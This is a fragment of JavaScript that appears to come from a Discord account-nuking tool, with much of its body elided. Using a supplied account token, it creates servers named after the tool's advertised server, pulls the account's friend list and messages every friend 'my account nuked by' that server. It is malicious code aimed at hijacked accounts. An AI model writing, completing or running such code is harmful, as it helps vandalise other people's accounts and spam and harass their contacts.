...
async function guildCreate(token) {
    ...
    data:{"name":"swan discord.gg/e1even","icon":null,"channels":[],"system_channel_id":null}
...
async function removeFriends(token) {
    ...
    await axios({ method: 'GET', url: base + '/users/@me/relationships', headers: {
            ...
            friends.forEach(async(friend) => {
                    await client.users.cache.get(friend.id).send({content : "my account nuked by (swan discord.gg/e1even"}).catch(err => {})
